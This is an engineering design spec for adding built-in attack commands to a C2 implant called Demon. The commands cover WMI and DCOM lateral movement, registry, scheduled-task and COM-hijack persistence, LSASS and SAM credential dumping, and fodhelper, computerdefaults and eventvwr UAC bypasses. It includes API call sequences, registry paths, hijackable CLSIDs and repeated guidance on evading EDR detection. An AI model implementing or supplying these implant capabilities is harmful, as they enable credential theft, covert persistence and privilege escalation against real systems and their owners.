# HVC-032 — New Agent Commands

**Status:** Pending

## Problem

Demon's current command set covers process management, file system operations, token manipulation,
injection, and basic network enumeration. Post-exploitation workflows that require lateral movement,
persistence, privilege escalation, credential access, and host network discovery are handled entirely
through BOF (Beacon Object File) uploads. This creates operational overhead on every engagement:
BOFs must be compiled, transferred, and re-uploaded on every new implant check-in. Built-in commands
eliminate that upload cost, are available the moment the implant registers, do not require a
functioning upload channel, and are harder to detect via EDR file-write telemetry triggered by BOF
transfers. Implementing the most common post-exploitation primitives natively improves reliability
and reduces the time-to-action for operators.

## Scope

| Component | Files affected |
|-----------|---------------|
| Demon | `payloads/Demon/include/core/Command.h` — new `DEMON_COMMAND_*` IDs and function declarations |
| Demon | `payloads/Demon/include/common/Defines.h` — new DJB2 hash constants |
| Demon | `payloads/Demon/src/core/Runtime.c` — resolve new function pointers at startup |
| Demon | `payloads/Demon/src/core/Command.c` — new handler cases (or split source files, see Notes) |
| Demon | `payloads/Demon/CMakeLists.txt` — add new source files if split |
| Teamserver | `teamserver/cmd/server/dispatch.go` — dispatch cases for each new top-level command ID |
| Client | `client/src/Havoc/Demon/ConsoleInput.cc` — help text entries for all new commands |

## Design

### Command ID Allocation

Existing top-level command IDs end at `DEMON_PACKAGE_FRAGMENT = 2580`. New groups are allocated in
blocks of 10, starting at 2600, to leave room for sub-commands within each group.

```c
/* payloads/Demon/include/core/Command.h — new top-level command IDs */
#define DEMON_COMMAND_LATERAL    2600   /* lateral movement group */
#define DEMON_COMMAND_PERSIST    2610   /* persistence group */
#define DEMON_COMMAND_CREDS      2620   /* credential access group */
#define DEMON_COMMAND_PRIVESC    2630   /* privilege escalation group */
#define DEMON_COMMAND_NETINFO    2640   /* network discovery group */
```

Sub-command discriminators follow the same convention used by existing groups (e.g.,
`DEMON_COMMAND_TOKEN_IMPERSONATE = 1`):

```c
/* Lateral movement sub-commands */
#define DEMON_LATERAL_WMI_EXEC   1
#define DEMON_LATERAL_DCOM_EXEC  2

/* Persistence sub-commands */
#define DEMON_PERSIST_REG        1
#define DEMON_PERSIST_SCHTASK    2
#define DEMON_PERSIST_COM        3
#define DEMON_PERSIST_REMOVE     4   /* clean-up companion */

/* Credential access sub-commands */
#define DEMON_CREDS_LSASS        1
#define DEMON_CREDS_SAM          2

/* Privilege escalation sub-commands */
#define DEMON_PRIVESC_UAC        1

/* Network discovery sub-commands */
#define DEMON_NETINFO_ADAPTERS   1
#define DEMON_NETINFO_ARP        2
```

---

## Group 1: Lateral Movement

### `wmi exec` — WMI Remote Process Creation

**Command ID:** `DEMON_COMMAND_LATERAL` / sub `DEMON_LATERAL_WMI_EXEC`

**Syntax:** `wmi exec <target> <command> [args]`

**Implementation approach:**

All COM interfaces are resolved entirely at runtime to avoid import table artifacts. No COM
libraries are linked at build time.

1. `CoInitializeEx(NULL, COINIT_MULTITHREADED)` — initialize COM for the current thread. Check
   `ole32.dll` in Runtime.c; add resolution if not already present.
2. `CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, &pLoc)`
   — obtain `IWbemLocator`.
3. `pLoc->ConnectServer(L"\\\\<target>\\root\\cimv2", NULL, NULL, 0, 0, 0, 0, &pSvc)` — connect
   to the remote namespace.
4. `pSvc->ExecMethod(L"Win32_Process", L"Create", 0, NULL, pInParams, &pOutParams, NULL)` — create
   the process on the remote host. The `CommandLine` parameter is set in `pInParams`.
5. Read `ProcessId` from `pOutParams` and return it in the agent output.
6. `CoUninitialize()` on cleanup.

**Win32 functions needed:**

| Function | Module | Status |
|----------|--------|--------|
| `CoInitializeEx` | `ole32.dll` | Not yet in Runtime.c — add resolution |
| `CoCreateInstance` | `ole32.dll` | Not yet in Runtime.c — add resolution |
| `CoUninitialize` | `ole32.dll` | Not yet in Runtime.c — add resolution |

**GUIDs (embedded as compile-time constants, not resolved dynamically):**

```c
/* CLSID_WbemLocator  {4590f811-1d3a-11d0-891f-00aa004b2e24} */
/* IID_IWbemLocator   {dc12a687-737f-11cf-884d-00aa004b2e24} */
/* IID_IWbemServices  {9556dc99-828c-11cf-a37e-00aa003240c7} */
```

Define these as `const GUID` constants in a header or directly in `Command_Lateral.c`. Do not
resolve them via the hash-based runtime resolver — they are interface identifiers, not function
addresses.

**New DJB2 hashes needed (`Defines.h`):**

```c
#define H_FUNC_COINITIALIZEEX    /* DJB2("COINITIALIZEEX") uppercased */
#define H_FUNC_COCREATEINSTANCE  /* DJB2("COCREATEINSTANCE") uppercased */
#define H_FUNC_COUNINITIALIZE    /* DJB2("COUNINITIALIZE") uppercased */
```

Compute actual hash values using the project's standard DJB2 seed (0x1337 for OdinLdr; confirm
which seed Runtime.c uses and apply consistently).

---

### `dcom exec` — DCOM Remote Code Execution

**Command ID:** `DEMON_COMMAND_LATERAL` / sub `DEMON_LATERAL_DCOM_EXEC`

**Syntax:** `dcom exec <target> <command>`

Two methods are supported, selected by operator at call time via an optional `/method` flag
(`mmc20` or `shellwindows`). Both use `CoCreateInstanceEx` with a populated `COSERVERINFO`
struct pointing at the remote host. Same `CoInitializeEx`/`CoUninitialize` lifecycle as WMI exec.

**Method 1 — `MMC20.Application`**
- CLSID: `{49B2791A-B1AE-4C90-9B8E-E860BA07F889}`
- Call: `Document.ActiveView.ExecuteShellCommand(command, NULL, args, "7")`
- Advantage: widely documented and reliable on Windows 7–11.
- Disadvantage: spawns under `mmc.exe`; process ancestry is visible.

**Method 2 — `ShellWindows`**
- CLSID: `{9BA05972-F6A8-11CF-A442-00A0C90A8F39}`
- Call: `Item(0).Document.Application.ShellExecute(command, args, "C:\\", NULL, 0)`
- Advantage: blends into existing Explorer windows; no `mmc.exe` parent.
- Disadvantage: requires at least one Explorer shell window open on the target; fails on Server
  Core and headless sessions.

Default method: `mmc20`. Operators should use `shellwindows` when Explorer is confirmed running.

---

## Group 2: Persistence

### `persist reg` — Registry Run Key

**Command ID:** `DEMON_COMMAND_PERSIST` / sub `DEMON_PERSIST_REG`

**Syntax:** `persist reg <name> <value> [/user | /system]`

**Implementation:**

```
RegOpenKeyExW(HKEY_CURRENT_USER or HKEY_LOCAL_MACHINE,
              L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
              0, KEY_SET_VALUE, &hKey)
RegSetValueExW(hKey, name, 0, REG_SZ, (BYTE*)value, (wcslen(value)+1)*sizeof(WCHAR))
RegCloseKey(hKey)
```

`/user` targets `HKEY_CURRENT_USER` (no elevation required). `/system` targets
`HKEY_LOCAL_MACHINE` (requires admin or SeBackupPrivilege). Default is `/user`.

**Registry function availability:**

`RegOpenKeyExW`, `RegQueryValueExW`, and `RegCloseKey` were resolved as part of HVC-026
(auto proxy detect, `Advapi32` section of Runtime.c). Only `RegSetValueExW` may need to be added.

**New hash needed:**

```c
#define H_FUNC_REGSETVALUEEXW   /* DJB2("REGSETVALUEEXW") uppercased */
```

Verify `RegSetValueExW` is not already present in `Defines.h` before adding. If a `/delete` path
is also needed for `persist remove`, add `RegDeleteValueW` at the same time.

---

### `persist schtask` — Scheduled Task

**Command ID:** `DEMON_COMMAND_PERSIST` / sub `DEMON_PERSIST_SCHTASK`

**Syntax:** `persist schtask <name> <command> <trigger>`

**Implementation:** Task Scheduler COM API via `ITaskService`. Uses the same dynamic COM resolution
pattern as WMI exec (`CoCreateInstance` / `QueryInterface`).

**COM interfaces needed:**

```c
/* CLSID_TaskScheduler  {0f87369f-a4e5-4cfc-bd3e-73e6154572dd} */
/* IID_ITaskService     {2faba4c7-4da9-4013-9697-20cc3fd40f85} */
/* IID_ITaskDefinition  {f5bc8fc5-536d-4f77-b852-fbc1356fdeb6} */
/* IID_IRegistrationInfo {416d8b73-cb41-4ea1-801c-96ef20f7d4ae} */
/* IID_ITriggerCollection {85df5081-1b24-4f32-878a-d9d14df4cb77} */
/* IID_IActionCollection  {02820e19-7b98-4ed2-b2e8-fdccceff619b} */
/* IID_ITaskFolder        {8cfac062-a080-4c15-9a88-aa7c2af80dfc} */
```

**Trigger types (pass as string argument):**

| Argument | Task Scheduler constant | Notes |
|----------|------------------------|-------|
| `logon` | `TASK_TRIGGER_LOGON` (9) | Fires when any user logs on |
| `boot` | `TASK_TRIGGER_BOOT` (8) | Fires at system boot; requires admin |
| `time:<ISO8601>` | `TASK_TRIGGER_TIME` (1) | One-shot at specified datetime |

**Removal:** `persist remove schtask <name>` calls `ITaskFolder::DeleteTask()`.

---

### `persist com` — COM Hijack (HKCU)

**Command ID:** `DEMON_COMMAND_PERSIST` / sub `DEMON_PERSIST_COM`

**Syntax:** `persist com <CLSID> <dll_path>`

**Implementation:**

Write the registry key:
```
HKCU\Software\Classes\CLSID\{<clsid>}\InprocServer32 = dll_path (REG_SZ)
HKCU\Software\Classes\CLSID\{<clsid>}\InprocServer32\ThreadingModel = "Apartment" (REG_SZ)
```

This does not require elevation because it targets `HKCU`. The target CLSID should be one that
a high-integrity process loads from `HKLM`, causing Windows to prefer the `HKCU` override.

**Known reliable targets (document in operator help text):**

| CLSID | Loaded by |
|-------|-----------|
| `{BCDE0395-E52F-467C-8E3D-C4579291692E}` | `MMDevAPI.dll` via `svchost.exe` |
| `{CF4CC405-E2C5-4DDD-B3CE-5E7582D8C9FA}` | Windows Defender service |
| `{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}` | `dllhost.exe` (various) |

**Removal:** `persist remove com <CLSID>` deletes the `HKCU\Software\Classes\CLSID\{clsid}` key
tree via `RegDeleteTreeW`.

---

### `persist remove` — Clean Up Persistence

**Command ID:** `DEMON_COMMAND_PERSIST` / sub `DEMON_PERSIST_REMOVE`

**Syntax:** `persist remove reg <name> [/user | /system]`
           `persist remove schtask <name>`
           `persist remove com <CLSID>`

Dispatches to the appropriate removal routine for each mechanism. Having a single removal surface
reduces operator errors.

---

## Group 3: Credential Access

### `creds lsass` — LSASS Memory Dump

**Command ID:** `DEMON_COMMAND_CREDS` / sub `DEMON_CREDS_LSASS`

**Syntax:** `creds lsass [/filename <path>]`

**Implementation (two options, preferred first):**

**Option A — `PssCaptureSnapshot` (preferred, higher OPSEC):**
1. Open lsass via `NtOpenProcess` (already in `Syscalls.c`) with
   `PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE`.
2. `PssCaptureSnapshot(hLsass, PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_THREADS,
   0, &hSnapshot)` — creates a process snapshot without calling `MiniDumpWriteDump` directly.
3. `MiniDumpWriteDump(hSnapshot, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL)` — write
   from the snapshot, not from lsass directly. Avoids lsass handle reads that many EDRs monitor.
4. Trigger the standard Demon file download flow to retrieve the dump file.

**Option B — Direct `MiniDumpWriteDump` (simpler, lower OPSEC):**
1. Open lsass via `NtOpenProcess`.
2. `MiniDumpWriteDump(hLsass, pid, hTempFile, MiniDumpWithFullMemory, NULL, NULL, NULL)`.

Default: Option A. Fall back to Option B only if `PssCaptureSnapshot` is unavailable (pre-Win8).

**New functions needed:**

| Function | Module | Hash constant |
|----------|--------|---------------|
| `MiniDumpWriteDump` | `dbghelp.dll` (load via `LdrLoadDll`) | `H_FUNC_MINIWRITEDUMP` |
| `PssCaptureSnapshot` | `kernel32.dll` | `H_FUNC_PSSCAPTURESNAPSHOT` |
| `PssFreeSnapshot` | `kernel32.dll` | `H_FUNC_PSSFREESNAPSHOT` |

```c
#define H_FUNC_MINIWRITEDUMP      /* DJB2("MINIDUMPWRITEDUMP") uppercased */
#define H_FUNC_PSSCAPTURESNAPSHOT /* DJB2("PSSCAPTURESNAPSHOT") uppercased */
#define H_FUNC_PSSFREESNAPSHOT    /* DJB2("PSSFREESNAPSHOT") uppercased */
```

**OPSEC notes:** Windows Defender flags `MiniDumpWriteDump` calls on lsass on default configs.
This is an inherently noisy operation. Operators should use PPL-bypass techniques or run this
from a SYSTEM-level token where possible.

---

### `creds sam` — SAM / SECURITY / SYSTEM Hive Dump

**Command ID:** `DEMON_COMMAND_CREDS` / sub `DEMON_CREDS_SAM`

**Syntax:** `creds sam`

**Implementation:**

```c
RegSaveKeyExW(HKEY_LOCAL_MACHINE\SAM,      tempSAM,    NULL, REG_LATEST_FORMAT)
RegSaveKeyExW(HKEY_LOCAL_MACHINE\SECURITY, tempSEC,    NULL, REG_LATEST_FORMAT)
RegSaveKeyExW(HKEY_LOCAL_MACHINE\SYSTEM,   tempSYSTEM, NULL, REG_LATEST_FORMAT)
```

Returns the three temp file paths to the operator for offline parsing with `secretsdump` or
equivalent tools. Temp paths are constructed using `GetTempPathW` + a random suffix.

**Privilege requirement:** Requires SYSTEM-level access or `SeBackupPrivilege`. The command must
verify privilege before attempting and return a descriptive error if insufficient.

**New hash needed:**

```c
#define H_FUNC_REGSAVEKEYEXW    /* DJB2("REGSAVEKEYEXW") uppercased */
```

`GetTempPathW` — check if already resolved in Runtime.c; add if not:
```c
#define H_FUNC_GETTEMPPATHW     /* DJB2("GETTEMPPATHW") uppercased */
```

---

## Group 4: Privilege Escalation

### `privesc uac` — UAC Bypass

**Command ID:** `DEMON_COMMAND_PRIVESC` / sub `DEMON_PRIVESC_UAC`

**Syntax:** `privesc uac <method> <command>`

Supported methods: `fodhelper`, `computerdefaults`, `eventvwr`.

**`fodhelper` method (document as primary):**

```
1. HKCU\Software\Classes\ms-settings\Shell\Open\command\ (Default) = <command>
2. HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute = ""
3. ShellExecuteW(NULL, L"open", L"fodhelper.exe", NULL, NULL, SW_HIDE)
```

`fodhelper.exe` is auto-elevate (manifest `autoElevate=true`) and reads the HKCU class override
before launching, executing `<command>` in a high-integrity context.

No new Win32 functions required for the registry writes (same `RegOpenKeyExW` / `RegSetValueExW`
/ `RegCreateKeyExW` as persist commands). `ShellExecuteW` must be resolved:

```c
#define H_FUNC_SHELLEXECUTEW    /* DJB2("SHELLEXECUTEW") uppercased */
```

**Cleanup:** Delete the HKCU key tree after launching to avoid leaving artifacts.

**`computerdefaults` and `eventvwr` methods:** Same technique, different target binary and
registry key path. Document per-method key paths in the source comment block.

**Version compatibility:**
- `fodhelper`: Windows 10 1607+ (tested through 24H2). May be patched in future Windows releases.
- `computerdefaults`: Windows 10 1803+.
- `eventvwr`: Windows 7+ but frequently patched and monitored by EDRs.

---

## Group 5: Network Discovery

### `net info` — Network Adapter Information

**Command ID:** `DEMON_COMMAND_NETINFO` / sub `DEMON_NETINFO_ADAPTERS`

**Syntax:** `net info`

**Implementation:** `GetAdaptersInfo` from `iphlpapi.dll`. The hash constant
`H_FUNC_GETADAPTERSINFO = 0x37cada45` is already defined in `Defines.h` (appears twice — deduplicate
during implementation). Verify the function pointer is resolved in `Runtime.c`; if not, add a
resolution call for `iphlpapi.dll`.

Output: adapter name, IP address, subnet mask, default gateway, MAC address, DHCP server (if any).

---

### `net arp` — ARP Table

**Command ID:** `DEMON_COMMAND_NETINFO` / sub `DEMON_NETINFO_ARP`

**Syntax:** `net arp`

**Implementation:** `GetIpNetTable2` from `iphlpapi.dll` (Vista+). Returns `MIB_IPNET_TABLE2`
with all ARP/NDP cache entries.

**New hash needed:**

```c
#define H_FUNC_GETIPNETTABLE2   /* DJB2("GETIPNETTABLE2") uppercased */
```

Also need `FreeMibTable` to release the buffer:
```c
#define H_FUNC_FREEMIBTABLE     /* DJB2("FREEMIBTABLE") uppercased */
```

---

## File Map

| File | Change |
|------|--------|
| `payloads/Demon/include/core/Command.h` | Add `DEMON_COMMAND_LATERAL/PERSIST/CREDS/PRIVESC/NETINFO` top-level IDs and all sub-command constants; add function declarations for new command handlers |
| `payloads/Demon/include/common/Defines.h` | Add new DJB2 hash constants for all new Win32 functions; deduplicate existing `H_FUNC_GETADAPTERSINFO` duplicate |
| `payloads/Demon/src/core/Runtime.c` | Add resolution for `CoInitializeEx`, `CoCreateInstance`, `CoUninitialize`, `MiniDumpWriteDump`, `PssCaptureSnapshot`, `PssFreeSnapshot`, `RegSetValueExW`, `RegSaveKeyExW`, `GetTempPathW`, `ShellExecuteW`, `GetIpNetTable2`, `FreeMibTable` |
| `payloads/Demon/src/core/Command.c` | Add top-level dispatch cases, or split (see Notes below) |
| `payloads/Demon/src/core/Command_Lateral.c` | New — `CommandLateral()`: WMI exec, DCOM exec |
| `payloads/Demon/src/core/Command_Persist.c` | New — `CommandPersist()`: reg, schtask, com hijack, remove |
| `payloads/Demon/src/core/Command_Creds.c` | New — `CommandCreds()`: lsass dump, SAM dump |
| `payloads/Demon/src/core/Command_Privesc.c` | New — `CommandPrivesc()`: UAC bypass methods |
| `payloads/Demon/CMakeLists.txt` | Add new `.c` source files to `DEMON_SOURCE` list |
| `teamserver/cmd/server/dispatch.go` | Add `case DEMON_COMMAND_LATERAL`, `DEMON_COMMAND_PERSIST`, `DEMON_COMMAND_CREDS`, `DEMON_COMMAND_PRIVESC`, `DEMON_COMMAND_NETINFO` to the agent dispatch switch |
| `client/src/Havoc/Demon/ConsoleInput.cc` | Add help text for `wmi exec`, `dcom exec`, `persist reg`, `persist schtask`, `persist com`, `persist remove`, `creds lsass`, `creds sam`, `privesc uac`, `net info`, `net arp` |

---

## Tests

- **`wmi exec`:** Execute `calc.exe` on a lab VM; verify process appears in process list on target.
- **`dcom exec` (both methods):** Same verification; confirm correct parent process.
- **`persist reg /user`:** Verify run key written; reboot lab VM; confirm payload executes.
- **`persist reg /system`:** Verify failure on non-admin token; verify success on admin token.
- **`persist schtask`:** Verify task appears in `schtasks /query`; trigger fires on logon.
- **`persist com`:** Verify HKCU key written; trigger load by launching the target application.
- **`persist remove`:** Verify each removal path cleans up its corresponding persistence mechanism.
- **`creds lsass`:** Verify dump file is created and non-zero; open in WinDbg or parse with
  `pypykatz` to confirm credentials are recoverable.
- **`creds sam`:** Verify three temp files created; verify failure on non-SYSTEM token.
- **`privesc uac`:** Run as medium-integrity user; verify launched process is high-integrity.
- **`net info`:** Verify all adapters reported; cross-check against `ipconfig /all`.
- **`net arp`:** Verify entries match `arp -a` output.

---

## Notes

- **No link-time COM imports.** All COM usage (WMI, Task Scheduler, DCOM) must go through
  dynamically resolved `CoCreateInstance`/`CoCreateInstanceEx`. Import table entries for OLE32
  are detectable by EDRs scanning loaded PE headers.
- **UAC bypass version compatibility.** The `fodhelper` and `computerdefaults` methods work on
  Windows 10/11 but may be patched in future cumulative updates. Document the tested OS build in
  the source comment block and check for `fodhelper.exe` existence before executing.
- **LSASS OPSEC.** All LSASS dump paths will trigger Windows Defender on default configurations.
  This is an inherently noisy offensive operation. The `PssCaptureSnapshot` path is harder to
  detect but not undetectable. Operators must have appropriate OPSEC plan before use.
- **Persistence cleanup.** Every persistence mechanism has a corresponding `persist remove`
  sub-command path. This is required — leaving persistence artifacts on an engagement system is
  an OPSEC failure.
- **`Command.c` file size.** At 3567 lines the file is at the practical maintainability limit.
  All new commands must be implemented in the split files (`Command_Lateral.c`, etc.); do not add
  further code to `Command.c` itself. The top-level dispatch in `Command.c` gains only a small
  routing call per new group.
- **No XOR encryption.** None of the new commands should use XOR for any cryptographic purpose.
  Registry values stored by persistence commands are stored in plaintext (obfuscation is the
  operator's responsibility via payload choice).
- **No RWX memory.** If any new command allocates executable memory (e.g., shellcode staging in
  a future lateral movement variant), it must follow the RW-then-RX pattern, never `PAGE_EXECUTE_READWRITE`.
